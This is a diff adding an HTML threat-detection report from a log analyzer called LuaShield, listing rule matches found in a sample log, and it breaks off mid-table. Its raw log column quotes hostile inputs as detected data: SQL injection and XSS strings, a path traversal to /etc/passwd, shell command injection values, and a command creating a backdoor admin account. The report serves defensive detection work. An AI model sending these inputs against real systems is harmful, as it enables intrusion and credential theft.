@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>LuaShield Report — sample.log</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600&family=IBM+Plex+Sans:wght@300;400;600;700&display=swap');
+
+  :root {
+    --bg:         #0d0f14;
+    --surface:    #13161e;
+    --surface2:   #1a1e2a;
+    --border:     #252a38;
+    --text:       #c9d1e0;
+    --muted:      #5a6278;
+    --accent:     #4a8fff;
+    --red:        #ff3b3b;
+    --orange:     #ff8c00;
+    --yellow:     #f5c400;
+    --green:      #4caf50;
+    --mono:       'IBM Plex Mono', monospace;
+    --sans:       'IBM Plex Sans', sans-serif;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--sans);
+    font-size: 14px;
+    line-height: 1.6;
+  }
+
+  /* Header */
+  header {
+    background: var(--surface);
+    border-bottom: 1px solid var(--border);
+    padding: 28px 40px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+  header h1 {
+    font-size: 22px;
+    font-weight: 700;
+    letter-spacing: 0.04em;
+    color: #fff;
+  }
+  header h1 span { color: var(--accent); }
+  .header-meta { color: var(--muted); font-size: 12px; font-family: var(--mono); text-align: right; }
+
+  /* Layout */
+  main { max-width: 1280px; margin: 0 auto; padding: 32px 40px 60px; }
+
+  h2 {
+    font-size: 13px;
+    font-weight: 600;
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+    color: var(--accent);
+    margin: 36px 0 14px;
+    padding-bottom: 8px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  /* Cards */
+  .cards {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+    gap: 14px;
+    margin-bottom: 8px;
+  }
+  .card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 20px 18px 16px;
+  }
+  .card-value {
+    font-size: 34px;
+    font-weight: 700;
+    font-family: var(--mono);
+    line-height: 1;
+    margin-bottom: 6px;
+  }
+  .card-label {
+    font-size: 11px;
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    color: var(--muted);
+  }
+
+  /* Tables */
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    overflow: hidden;
+  }
+  th {
+    background: var(--surface2);
+    color: var(--muted);
+    font-size: 11px;
+    font-weight: 600;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    padding: 10px 14px;
+    text-align: left;
+    border-bottom: 1px solid var(--border);
+  }
+  td {
+    padding: 9px 14px;
+    border-bottom: 1px solid var(--border);
+    vertical-align: top;
+  }
+  tr:last-child td { border-bottom: none; }
+  tr:hover td { background: var(--surface2); }
+
+  .table-scroll { overflow-x: auto; }
+
+  /* Badge & pill */
+  .badge {
+    display: inline-block;
+    padding: 2px 8px;
+    border-radius: 3px;
+    font-size: 11px;
+    font-weight: 700;
+    font-family: var(--mono);
+    letter-spacing: 0.05em;
+    white-space: nowrap;
+  }
+  .pill {
+    display: inline-block;
+    padding: 2px 7px;
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    border-radius: 3px;
+    font-size: 11px;
+    font-family: var(--mono);
+    color: var(--muted);
+    margin-right: 4px;
+  }
+
+  /* Bar chart */
+  .bar-wrap {
+    background: var(--surface2);
+    border-radius: 2px;
+    height: 8px;
+    width: 200px;
+  }
+  .bar {
+    background: var(--accent);
+    height: 8px;
+    border-radius: 2px;
+    min-width: 2px;
+  }
+
+  /* Utility */
+  .mono  { font-family: var(--mono); }
+  .small { font-size: 12px; }
+  .muted { color: var(--muted); }
+  .truncate { max-width: 480px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+  code { font-family: var(--mono); color: var(--accent); font-size: 12px; }
+
+  /* No threats message */
+  .no-threats {
+    text-align: center;
+    padding: 60px 20px;
+    color: var(--green);
+    font-size: 18px;
+    font-weight: 600;
+  }
+
+  footer {
+    margin-top: 60px;
+    padding-top: 20px;
+    border-top: 1px solid var(--border);
+    text-align: center;
+    color: var(--muted);
+    font-size: 12px;
+    font-family: var(--mono);
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div>
+    <h1>Lua<span>Shield</span></h1>
+    <div style="color:var(--muted);font-size:12px;margin-top:4px">Log Analyzer and Threat Detection Report</div>
+  </div>
+  <div class="header-meta">
+    <div>File: sample.log</div>
+    <div>Generated: 2026-04-15 19:59:36</div>
+  </div>
+</header>
+
+<main>
+
+  <h2>Summary</h2>
+  <div class="cards">        <div class="card">
+            <div class="card-value" style="color:#7eb8f7">49</div>
+            <div class="card-label">Log Entries Parsed</div>
+        </div>
+        <div class="card">
+            <div class="card-value" style="color:#ff6b6b">38</div>
+            <div class="card-label">Total Threats</div>
+        </div>
+        <div class="card">
+            <div class="card-value" style="color:#ff3b3b">12</div>
+            <div class="card-label">Critical</div>
+        </div>
+        <div class="card">
+            <div class="card-value" style="color:#ff8c00">15</div>
+            <div class="card-label">High</div>
+        </div>
+        <div class="card">
+            <div class="card-value" style="color:#f5c400">5</div>
+            <div class="card-label">Medium</div>
+        </div>
+        <div class="card">
+            <div class="card-value" style="color:#4caf50">6</div>
+            <div class="card-label">Low</div>
+        </div></div>
+
+  <h2>Threats by Category</h2>
+      <table>
+        <thead><tr><th>Category</th><th>Hits</th><th>Relative Volume</th></tr></thead>
+        <tbody>        <tr>
+            <td><span class="pill">MAL</span> malware</td>
+            <td>8</td>
+            <td><div class="bar-wrap"><div class="bar" style="width:100%"></div></div></td>
+        </tr>
+        <tr>
+            <td><span class="pill">AUTH</span> auth</td>
+            <td>7</td>
+            <td><div class="bar-wrap"><div class="bar" style="width:87%"></div></div></td>
+        </tr>
+        <tr>
+            <td><span class="pill">BF</span> brute_force</td>
+            <td>7</td>
+            <td><div class="bar-wrap"><div class="bar" style="width:87%"></div></div></td>
+        </tr>
+        <tr>
+            <td><span class="pill">INJ</span> injection</td>
+            <td>7</td>
+            <td><div class="bar-wrap"><div class="bar" style="width:87%"></div></div></td>
+        </tr>
+        <tr>
+            <td><span class="pill">REC</span> recon</td>
+            <td>4</td>
+            <td><div class="bar-wrap"><div class="bar" style="width:50%"></div></div></td>
+        </tr>
+        <tr>
+            <td><span class="pill">ANO</span> anomaly</td>
+            <td>3</td>
+            <td><div class="bar-wrap"><div class="bar" style="width:37%"></div></div></td>
+        </tr>
+        <tr>
+            <td><span class="pill">EXF</span> exfil</td>
+            <td>2</td>
+            <td><div class="bar-wrap"><div class="bar" style="width:25%"></div></div></td>
+        </tr></tbody>
+    </table>
+
+  <h2>Top Source IPs / Hosts</h2>
+      <table>
+        <thead><tr><th>Source IP / Host</th><th>Total Hits</th><th>Worst Severity</th></tr></thead>
+        <tbody>        <tr>
+            <td><code>edr</code></td>
+            <td>6</td>
+            <td><span class="badge" style="color:#ff3b3b;background:#2a0a0a;border:1px solid #ff3b3b">CRITICAL</span></td>
+        </tr>
+        <tr>
+            <td><code>10.0.0.42</code></td>
+            <td>6</td>
+            <td><span class="badge" style="color:#ff3b3b;background:#2a0a0a;border:1px solid #ff3b3b">CRITICAL</span></td>
+        </tr>
+        <tr>
+            <td><code>203.0.113.55</code></td>
+            <td>4</td>
+            <td><span class="badge" style="color:#f5c400;background:#2a2200;border:1px solid #f5c400">MEDIUM</span></td>
+        </tr>
+        <tr>
+            <td><code>192.168.1.100</code></td>
+            <td>4</td>
+            <td><span class="badge" style="color:#ff8c00;background:#2a1800;border:1px solid #ff8c00">HIGH</span></td>
+        </tr>
+        <tr>
+            <td><code>auth</code></td>
+            <td>3</td>
+            <td><span class="badge" style="color:#ff3b3b;background:#2a0a0a;border:1px solid #ff3b3b">CRITICAL</span></td>
+        </tr>
+        <tr>
+            <td><code>91.108.4.33</code></td>
+            <td>3</td>
+            <td><span class="badge" style="color:#ff8c00;background:#2a1800;border:1px solid #ff8c00">HIGH</span></td>
+        </tr>
+        <tr>
+            <td><code>172.16.0.10</code></td>
+            <td>2</td>
+            <td><span class="badge" style="color:#ff3b3b;background:#2a0a0a;border:1px solid #ff3b3b">CRITICAL</span></td>
+        </tr>
+        <tr>
+            <td><code>5.188.206.14</code></td>
+            <td>2</td>
+            <td><span class="badge" style="color:#f5c400;background:#2a2200;border:1px solid #f5c400">MEDIUM</span></td>
+        </tr>
+        <tr>
+            <td><code>198.51.100.7</code></td>
+            <td>1</td>
+            <td><span class="badge" style="color:#ff8c00;background:#2a1800;border:1px solid #ff8c00">HIGH</span></td>
+        </tr>
+        <tr>
+            <td><code>185.220.101.7</code></td>
+            <td>1</td>
+            <td><span class="badge" style="color:#ff3b3b;background:#2a0a0a;border:1px solid #ff3b3b">CRITICAL</span></td>
+        </tr></tbody>
+    </table>
+
+  <h2>Threat Event Log</h2>
+      <div class="table-scroll">
+    <table>
+        <thead>
+            <tr>
+                <th>Timestamp</th>
+                <th>Severity</th>
+                <th>Rule</th>
+                <th>Category</th>
+                <th>Raw Log (truncated)</th>
+            </tr>
+        </thead>
+        <tbody>        <tr>
+            <td class="mono small">2024-03-15 01:23:44</td>
+            <td><span class="badge" style="color:#ff8c00;background:#2a1800;border:1px solid #ff8c00">HIGH</span></td>
+            <td><strong>SSH Brute Force Attempt</strong><br><span class="muted small">BF-001 — Repeated failed SSH authentication from a single source.</span></td>
+            <td><span class="pill">BF</span></td>
+            <td class="mono small truncate" title="[2024-03-15 01:23:44] INFO sshd Failed password for invalid user admin from 192.168.1.100 port 52341 ssh2">[2024-03-15 01:23:44] INFO sshd Failed password for invalid user admin from 192.168.1.100 port 52341 ssh2</td>
+        </tr>
+        <tr>
+            <td class="mono small">2024-03-15 01:23:46</td>
+            <td><span class="badge" style="color:#ff8c00;background:#2a1800;border:1px solid #ff8c00">HIGH</span></td>
+            <td><strong>SSH Brute Force Attempt</strong><br><span class="muted small">BF-001 — Repeated failed SSH authentication from a single source.</span></td>
+            <td><span class="pill">BF</span></td>
+            <td class="mono small truncate" title="[2024-03-15 01:23:46] INFO sshd Failed password for invalid user root from 192.168.1.100 port 52342 ssh2">[2024-03-15 01:23:46] INFO sshd Failed password for invalid user root from 192.168.1.100 port 52342 ssh2</td>
+        </tr>
+        <tr>
+            <td class="mono small">2024-03-15 01:23:48</td>
+            <td><span class="badge" style="color:#ff8c00;background:#2a1800;border:1px solid #ff8c00">HIGH</span></td>
+            <td><strong>SSH Brute Force Attempt</strong><br><span class="muted small">BF-001 — Repeated failed SSH authentication from a single source.</span></td>
+            <td><span class="pill">BF</span></td>
+            <td class="mono small truncate" title="[2024-03-15 01:23:48] INFO sshd Failed password for invalid user admin from 192.168.1.100 port 52343 ssh2">[2024-03-15 01:23:48] INFO sshd Failed password for invalid user admin from 192.168.1.100 port 52343 ssh2</td>
+        </tr>
+        <tr>
+            <td class="mono small">2024-03-15 01:23:50</td>
+            <td><span class="badge" style="color:#ff8c00;background:#2a1800;border:1px solid #ff8c00">HIGH</span></td>
+            <td><strong>SSH Brute Force Attempt</strong><br><span class="muted small">BF-001 — Repeated failed SSH authentication from a single source.</span></td>
+            <td><span class="pill">BF</span></td>
+            <td class="mono small truncate" title="[2024-03-15 01:23:50] INFO sshd Failed password for invalid user ubuntu from 192.168.1.100 port 52344 ssh2">[2024-03-15 01:23:50] INFO sshd Failed password for invalid user ubuntu from 192.168.1.100 port 52344 ssh2</td>
+        </tr>
+        <tr>
+            <td class="mono small">2024-03-15 02:10:05</td>
+            <td><span class="badge" style="color:#ff3b3b;background:#2a0a0a;border:1px solid #ff3b3b">CRITICAL</span></td>
+            <td><strong>SQL Injection Attempt</strong><br><span class="muted small">INJ-001 — Classic SQL injection patterns detected in a request.</span></td>
+            <td><span class="pill">INJ</span></td>
+            <td class="mono small truncate" title="[2024-03-15 02:10:05] INFO apache 10.0.0.42 GET /index.php?id=1' OR '1'='1 -&gt; HTTP 200">[2024-03-15 02:10:05] INFO apache 10.0.0.42 GET /index.php?id=1' OR '1'='1 -&gt; HTTP 200</td>
+        </tr>
+        <tr>
+            <td class="mono small">2024-03-15 02:10:07</td>
+            <td><span class="badge" style="color:#ff3b3b;background:#2a0a0a;border:1px solid #ff3b3b">CRITICAL</span></td>
+            <td><strong>SQL Injection Attempt</strong><br><span class="muted small">INJ-001 — Classic SQL injection patterns detected in a request.</span></td>
+            <td><span class="pill">INJ</span></td>
+            <td class="mono small truncate" title="[2024-03-15 02:10:07] INFO apache 10.0.0.42 GET /index.php?id=1 UNION SELECT username,password FROM users-- -&gt; HTTP 500">[2024-03-15 02:10:07] INFO apache 10.0.0.42 GET /index.php?id=1 UNION SELECT username,password FROM users-- -&gt; HTTP 500</td>
+        </tr>
+        <tr>
+            <td class="mono small">2024-03-15 02:10:09</td>
+            <td><span class="badge" style="color:#ff8c00;background:#2a1800;border:1px solid #ff8c00">HIGH</span></td>
+            <td><strong>Cross-Site Scripting (XSS) Attempt</strong><br><span class="muted small">INJ-002 — XSS payload detected in request.</span></td>
+            <td><span class="pill">INJ</span></td>
+            <td class="mono small truncate" title="[2024-03-15 02:10:09] WARN apache 10.0.0.42 GET /login?user=&lt;script&gt;alert('xss')&lt;/script&gt; -&gt; HTTP 400">[2024-03-15 02:10:09] WARN apache 10.0.0.42 GET /login?user=&lt;script&gt;alert('xss')&lt;/script&gt; -&gt; HTTP 400</td>
+        </tr>
+        <tr>
+            <td class="mono small">2024-03-15 02:10:09</td>
+            <td><span class="badge" style="color:#4caf50;background:#0a1f0a;border:1px solid #4caf50">LOW</span></td>
+            <td><strong>After-Hours Authentication</strong><br><span class="muted small">AUTH-003 — Successful login between midnight and 6am.</span></td>
+            <td><span class="pill">AUTH</span></td>
+            <td class="mono small truncate" title="[2024-03-15 02:10:09] WARN apache 10.0.0.42 GET /login?user=&lt;script&gt;alert('xss')&lt;/script&gt; -&gt; HTTP 400">[2024-03-15 02:10:09] WARN apache 10.0.0.42 GET /login?user=&lt;script&gt;alert('xss')&lt;/script&gt; -&gt; HTTP 400</td>
+        </tr>
+        <tr>
+            <td class="mono small">2024-03-15 03:45:12</td>
+            <td><span class="badge" style="color:#f5c400;background:#2a2200;border:1px solid #f5c400">MEDIUM</span></td>
+            <td><strong>Port Scan Detected</strong><br><span class="muted small">REC-001 — Scanning behavior -- multiple rapid port connection attempts.</span></td>
+            <td><span class="pill">REC</span></td>
+            <td class="mono small truncate" title="[2024-03-15 03:45:12] INFO firewall Port scan detected from 203.0.113.55 targeting ports 22,80,443,3306,5432">[2024-03-15 03:45:12] INFO firewall Port scan detected from 203.0.113.55 targeting ports 22,80,443,3306,5432</td>
+        </tr>
+        <tr>
+            <td class="mono small">2024-03-15 03:45:14</td>
+            <td><span class="badge" style="color:#f5c400;background:#2a2200;border:1px solid #f5c400">MEDIUM</span></td>
+            <td><strong>Port Scan Detected</strong><br><span class="muted small">REC-001 — Scanning behavior -- multiple rapid port connection attempts.</span></td>
+            <td><span class="pill">REC</span></td>
+            <td class="mono small truncate" title="[2024-03-15 03:45:14] INFO ids Nmap scan detected from 203.0.113.55">[2024-03-15 03:45:14] INFO ids Nmap scan detected from 203.0.113.55</td>
+        </tr>
+        <tr>
+            <td class="mono small">2024-03-15 03:47:01</td>
+            <td><span class="badge" style="color:#4caf50;background:#0a1f0a;border:1px solid #4caf50">LOW</span></td>
+            <td><strong>Repeated 403 Forbidden</strong><br><span class="muted small">ANO-002 — Multiple access-denied responses -- possible unauthorized access attempt.</span></td>
+            <td><span class="pill">ANO</span></td>
+            <td class="mono small truncate" title="[2024-03-15 03:47:01] WARN apache 203.0.113.55 GET /wp-admin/ -&gt; HTTP 403 access denied">[2024-03-15 03:47:01] WARN apache 203.0.113.55 GET /wp-admin/ -&gt; HTTP 403 access denied</td>
+        </tr>
+        <tr>
+            <td class="mono small">2024-03-15 03:47:02</td>
+            <td><span class="badge" style="color:#4caf50;background:#0a1f0a;border:1px solid #4caf50">LOW</span></td>
+            <td><strong>Repeated 403 Forbidden</strong><br><span class="muted small">ANO-002 — Multiple access-denied responses -- possible unauthorized access attempt.</span></td>
+            <td><span class="pill">ANO</span></td>
+            <td class="mono small truncate" title="[2024-03-15 03:47:02] WARN apache 203.0.113.55 GET /phpmyadmin/ -&gt; HTTP 403 forbidden">[2024-03-15 03:47:02] WARN apache 203.0.113.55 GET /phpmyadmin/ -&gt; HTTP 403 forbidden</td>
+        </tr>
+        <tr>
+            <td class="mono small">2024-03-15 04:02:30</td>
+            <td><span class="badge" style="color:#ff3b3b;background:#2a0a0a;border:1px solid #ff3b3b">CRITICAL</span></td>
+            <td><strong>C2 Beacon Pattern</strong><br><span class="muted small">MAL-001 — Outbound connection consistent with C2 beaconing.</span></td>
+            <td><span class="pill">MAL</span></td>
+            <td class="mono small truncate" title="[2024-03-15 04:02:30] CRITICAL edr C2 beacon pattern detected - host WIN-PC04 contacting 185.220.101.7 (known cobalt strike C2)">[2024-03-15 04:02:30] CRITICAL edr C2 beacon pattern detected - host WIN-PC04 contacting 185.220.101.7 (known cobalt str</td>
+        </tr>
+        <tr>
+            <td class="mono small">2024-03-15 04:03:15</td>
+            <td><span class="badge" style="color:#ff3b3b;background:#2a0a0a;border:1px solid #ff3b3b">CRITICAL</span></td>
+            <td><strong>C2 Beacon Pattern</strong><br><span class="muted small">MAL-001 — Outbound connection consistent with C2 beaconing.</span></td>
+            <td><span class="pill">MAL</span></td>
+            <td class="mono small truncate" title="[2024-03-15 04:03:15] CRITICAL edr Meterpreter session established from WIN-PC04">[2024-03-15 04:03:15] CRITICAL edr Meterpreter session established from WIN-PC04</td>
+        </tr>
+        <tr>
+            <td class="mono small">2024-03-15 04:05:00</td>
+            <td><span class="badge" style="color:#ff8c00;background:#2a1800;border:1px solid #ff8c00">HIGH</span></td>
+            <td><strong>Suspicious Process Execution</strong><br><span class="muted small">MAL-003 — Unusual process -- possible living-off-the-land attack.</span></td>
+            <td><span class="pill">MAL</span></td>
+            <td class="mono small truncate" title="[2024-03-15 04:05:00] CRITICAL edr Suspicious process execution: powershell.exe -enc SQBFAFgA...">[2024-03-15 04:05:00] CRITICAL edr Suspicious process execution: powershell.exe -enc SQBFAFgA...</td>
+        </tr>
+        <tr>
+            <td class="mono small">2024-03-15 04:05:30</td>
+            <td><span class="badge" style="color:#ff8c00;background:#2a1800;border:1px solid #ff8c00">HIGH</span></td>
+            <td><strong>Suspicious Process Execution</strong><br><span class="muted small">MAL-003 — Unusual process -- possible living-off-the-land attack.</span></td>
+            <td><span class="pill">MAL</span></td>
+            <td class="mono small truncate" title="[2024-03-15 04:05:30] CRITICAL edr cmd.exe /c whoami &amp;&amp; net user hacker P@ssw0rd /add">[2024-03-15 04:05:30] CRITICAL edr cmd.exe /c whoami &amp;&amp; net user hacker P@ssw0rd /add</td>
+        </tr>
+        <tr>
+            <td class="mono small">2024-03-15 04:15:44</td>
+            <td><span class="badge" style="color:#ff3b3b;background:#2a0a0a;border:1px solid #ff3b3b">CRITICAL</span></td>
+            <td><strong>Ransomware Indicator</strong><br><span class="muted small">MAL-002 — File encryption or ransomware-related activity detected.</span></td>
+            <td><span class="pill">MAL</span></td>
+            <td class="mono small truncate" title="[2024-03-15 04:15:44] CRITICAL edr Ransomware indicator: bulk file rename to .encrypted extension detected on \\fileserver\shares">[2024-03-15 04:15:44] CRITICAL edr Ransomware indicator: bulk file rename to .encrypted extension detected on \\fileserv</td>
+        </tr>
+        <tr>
+            <td class="mono small">2024-03-15 04:15:45</td>
+            <td><span class="badge" style="color:#ff3b3b;background:#2a0a0a;border:1px solid #ff3b3b">CRITICAL</span></td>
+            <td><strong>Ransomware Indicator</strong><br><span class="muted small">MAL-002 — File encryption or ransomware-related activity detected.</span></td>
+            <td><span class="pill">MAL</span></td>
+            <td class="mono small truncate" title="[2024-03-15 04:15:45] CRITICAL edr readme_to_decrypt.txt created in 14 directories">[2024-03-15 04:15:45] CRITICAL edr readme_to_decrypt.txt created in 14 directories</td>
+        </tr>
+        <tr>
+            <td class="mono small">2024-03-15 05:00:01</td>
+            <td><span class="badge" style="color:#ff8c00;background:#2a1800;border:1px solid #ff8c00">HIGH</span></td>
+            <td><strong>Large Outbound Transfer</strong><br><span class="muted small">EXF-001 — Unusually large data transfer to an external host.</span></td>
+            <td><span class="pill">EXF</span></td>
+            <td class="mono small truncate" title="[2024-03-15 05:00:01] HIGH transfer Data exfiltration suspected: 250mb upload to 185.220.101.8 over port 443">[2024-03-15 05:00:01] HIGH transfer Data exfiltration suspected: 250mb upload to 185.220.101.8 over port 443</td>
+        </tr>
+        <tr>
+            <td class="mono small">2024-03-15 05:10:10</td>
+            <td><span class="badge" style="color:#ff8c00;background:#2a1800;border:1px solid #ff8c00">HIGH</span></td>
+            <td><strong>DNS Tunneling Suspected</strong><br><span class="muted small">EXF-002 — Long or encoded DNS queries -- possible DNS tunneling.</span></td>
+            <td><span class="pill">EXF</span></td>
+            <td class="mono small truncate" title="[2024-03-15 05:10:10] HIGH dns DNS tunneling suspected: dnscat2 tool signatures detected in DNS queries">[2024-03-15 05:10:10] HIGH dns DNS tunneling suspected: dnscat2 tool signatures detected in DNS queries</td>
+        </tr>
+        <tr>
+            <td class="mono small">2024-03-15 06:30:00</td>
+            <td><span class="badge" style="color:#ff3b3b;background:#2a0a0a;border:1px solid #ff3b3b">CRITICAL</span></td>
+            <td><strong>Privilege Escalation</strong><br><span class="muted small">AUTH-001 — Attempt to gain elevated privileges.</span></td>
+            <td><span class="pill">AUTH</span></td>
+            <td class="mono small truncate" title="[2024-03-15 06:30:00] CRITICAL auth Privilege escalation detected: user www-data ran sudo su successfully">[2024-03-15 06:30:00] CRITICAL auth Privilege escalation detected: user www-data ran sudo su successfully</td>
+        </tr>
+        <tr>
+            <td class="mono small">2024-03-15 06:30:10</td>
+            <td><span class="badge" style="color:#ff8c00;background:#2a1800;border:1px solid #ff8c00">HIGH</span></td>
+            <td><strong>Root / Admin Login</strong><br><span class="muted small">AUTH-002 — Direct login as root or administrator account.</span></td>
+            <td><span class="pill">AUTH</span></td>
+            <td class="mono small truncate" title="[2024-03-15 06:30:10] HIGH auth Root login accepted from 10.0.0.99 via SSH">[2024-03-15 06:30:10] HIGH auth Root login accepted from 10.0.0.99 via SSH</td>
+        </tr>
+        <tr>
+            <td class="mono small">2024-03-15 09:15:00</td>
+            <td><span class="badge" style="color:#ff8c00;background:#2a1800;border:1px solid #ff8c00">HIGH</span></td>
+            <td><strong>Path Traversal Attempt</strong><br><span class="muted small">INJ-003 — Directory traversal sequences detected.</span></td>
+            <td><span class="pill">INJ</span></td>
+            <td class="mono small truncate" title="[2024-03-15 09:15:00] WARN apache 198.51.100.7 GET /admin/../../../etc/passwd -&gt; HTTP 400">[2024-03-15 09:15:00] WARN apache 198.51.100.7 GET /admin/../../../etc/passwd -&gt; HTTP 400</td>
+        </tr>
+        <tr>
+            <td class="mono small">2024-03-15 10:20:05</td>
+            <td><span class="badge" style="color:#ff3b3b;background:#2a0a0a;border:1px solid #ff3b3b">CRITICAL</span></td>
+            <td><strong>Command Injection</strong><br><span class="muted small">INJ-004 — Shell command injection patterns in user input.</span></td>
+            <td><span class="pill">INJ</span></td>
+            <td class="mono small truncate" title="[2024-03-15 10:20:05] WARN apache 172.16.0.10 GET /search?q=;cat /etc/passwd -&gt; HTTP 500 internal server error">[2024-03-15 10:20:05] WARN apache 172.16.0.10 GET /search?q=;cat /etc/passwd -&gt; HTTP 500 internal server error</td>
+        </tr>
+        <tr>
+            <td class="mono small">2024-03-15 10:20:05</td>
+            <td><span class="badge" style="color:#f5c400;background:#2a2200;border:1px solid #f5c400">MEDIUM</span></td>
+            <td><strong>HTTP 500 Internal Server Error</strong><br><span class="muted small">ANO-001 — Server error -- may indicate exploitation or app crash.</span></td>
+            <td><span class="pill">ANO</span></td>
+            <td class="mono small truncate" title="[2024-03-15 10:20:05] WARN apache 172.16.0.10 GET /search?q=;cat /etc/passwd -&gt; HTTP 500 internal server error">[2024-03-15 10:20:05] WARN apache 172.16.0.10 GET /search?q=;cat /etc/passwd -&gt; HTTP 500 internal server error</td>
+        </tr>
+        <tr>
+            <td class="mono small">2024-03-15 11:00:00</td>
+            <td><span class="badge" style="color:#ff8c00;background:#2a1800;border:1px solid #ff8c00">HIGH</span></td>
+            <td><strong>SSH Brute Force Attempt</strong><br><span class="muted small">BF-001 — Repeated failed SSH authentication from a single source.</span></td>
+            <td><span class="pill">BF</span></td>
+            <td class="mono small truncate" title="[2024-03-15 11:00:00] INFO sshd Failed password for user deploy from 91.108.4.33 port 44200 ssh2">[2024-03-15 11:00:00] INFO sshd Failed password for user deploy from 91.108.4.33 port 44200 ssh2</td>
+        </tr>
+        <tr>
+            <td class="mono small">2024-03-15 11:00:02</td>
+            <td><span class="badge" style="color:#f5c400;background:#2a2200;border:1px solid #f5c400">MEDIUM</span></td>
+            <td><strong>Multiple Login Failures</strong><br><span class="muted small">BF-002 — Generic login failure -- possible credential stuffing.</span></td>
+            <td><span class="pill">BF</span></td>
+            <td class="mono small truncate" title="[2024-03-15 11:00:02] INFO sshd Login failed for user deploy from 91.108.4.33">[2024-03-15 11:00:02] INFO sshd Login failed for user deploy from 91.108.4.33</td>
+        </tr>
+        <tr>
+            <td class="mono small">2024-03-15 11:00:04</td>
+            <td><span class="badge" style="color:#ff8c00;background:#2a1800;border:1px solid #ff8c00">HIGH</span></td>
+            <td><strong>Account Lockout Triggered</strong><br><span class="muted small">BF-003 — Account locked due to too many failed attempts.</span></td>
+            <td><span class="pill">BF</span></td>
+            <td class="mono small truncate" title="[2024-03-15 11:00:04] INFO sshd Account locked: too many attempts for user deploy from 91.108.4.33">[2024-03-15 11:00:04] INFO sshd Account locked: too many attempts for user deploy from 91.108.4.33</td>
+        </tr>
+        <tr>
+            <td class="mono small">2024-03-15 13:00:00</td>
+            <td><span class="badge" style="color:#4caf50;background:#0a1f0a;border:1px solid #4caf50">LOW</span></td>
+            <td><strong>Suspicious User-Agent</strong><br><span class="muted small">REC-003 — Known scanner or exploit framework user-agent string.</span></td>
+            <td><span class="pill">REC</span></td>
+            <td class="mono small truncate" title="[2024-03-15 13:00:00] WARN ids sqlmap user-agent detected from 5.188.206.14">[2024-03-15 13:00:00] WARN ids sqlmap user-agent detected from 5.188.206.14</td>
+        </tr>
+        <tr>
+            <td class="mono small">2024-03-15 13:00:05</td>
+            <td><span class="badge" style="color:#f5c400;background:#2a2200;border:1px solid #f5c400">MEDIUM</span></td>
+            <td><strong>Web Directory Enumeration</strong><br><span class="muted small">REC-002 — Web crawler or directory brute-force tool detected.</span></td>
+            <td><span class="pill">REC</span></td>
+            <td class="mono small truncate" title="[2024-03-15 13:00:05] WARN ids GoBuster directory enumeration from 5.188.206.14">[2024-03-15 13:00:05] WARN ids GoBuster directory enumeration from 5.188.206.14</td>
+        </tr>
+        <tr>
+            <td class="mono small">2024-03-15 16:00:00</td>
+            <td><span class="badge" style="color:#ff3b3b;background:#2a0a0a;border:1px solid #ff3b3b">CRITICAL</span></td>
+            <td><strong>Command Injection</strong><br><span class="muted small">INJ-004 — Shell command injection patterns in user input.</span></td>
+            <td><span class="pill">INJ</span></td>
+            <td class="mono small truncate" title="[2024-03-15 16:00:00] WARN apache 10.0.0.42 POST /api/exec?cmd=`whoami` -&gt; HTTP 400">[2024-03-15 16:00:00] WARN apache 10.0.0.42 POST /api/exec?cmd=`whoami` -&gt; HTTP 400</td>
+        </tr>
+        <tr>
+            <td class="mono small">2024-03-15 16:00:05</td>
+            <td><span class="badge" style="color:#ff3b3b;background:#2a0a0a;border:1px solid #ff3b3b">CRITICAL</span></td>
+            <td><strong>Command Injection</strong><br><span class="muted small">INJ-004 — Shell command injection patterns in user input.</span></td>
+            <td><span class="pill">INJ</span></td>
+            <td class="mono small truncate" title="[2024-03-15 16:00:05] WARN apache 10.0.0.42 POST /api/exec?cmd=$(id) -&gt; HTTP 400">[2024-03-15 16:00:05] WARN apache 10.0.0.42 POST /api/exec?cmd=$(id) -&gt; HTTP 400</td>
+        </tr>
+        <tr>
+            <td class="mono small">2024-03-16 00:05:00</td>
+            <td><span class="badge" style="color:#4caf50;background:#0a1f0a;border:1px solid #4caf50">LOW</span></td>
+            <td><strong>After-Hours Authentication</strong><br><span class="muted small">AUTH-003 — Successful login between midnight and 6am.</span></td>
+            <td><span class="pill">AUTH</span></td>
+            <td class="mono small truncate" title="[2024-03-16 00:05:00] INFO sshd Accepted password for backup from 10.10.10.201 port 55200 ssh2">[2024-03-16 00:05:00] INFO sshd Accepted password for backup from 10.10.10.201 port 55200 ssh2</td>
+        </tr>
+        <tr>
+            <td class="mono small">2024-03-16 00:05:01</td>
+            <td><span class="badge" style="color:#4caf50;background:#0a1f0a;border:1px solid #4caf50">LOW</span></td>
+            <td><strong>After-Hours Authentication</strong><br><span class="muted small">AUTH-003 — Successful login between midnight and 6am.</span></td>
+            <td><span class="pill">AUTH</span></td>
+            <td class="mono small truncate" title="[2024-03-16 00:05:01] INFO syslog session opened for user backup - login accepted">[2024-03-16 00:05:01] INFO syslog session opened for user backup - login accepted</td>
+        </tr>
+        <tr>
+            <td class="mono small">2024-03-16 02:44:00</td>
+            <td><span class="badge" style="color:#ff3b3b;background:#2a0a0a;border:1px solid #ff3b3b">CRITICAL</span></td>
+            <td><strong>Privilege Escalation</strong><br><span class="muted small">AUTH-001 — Attempt to gain elevated privileges.</span></td>
+            <td><span class="pill">AUTH</span></td>
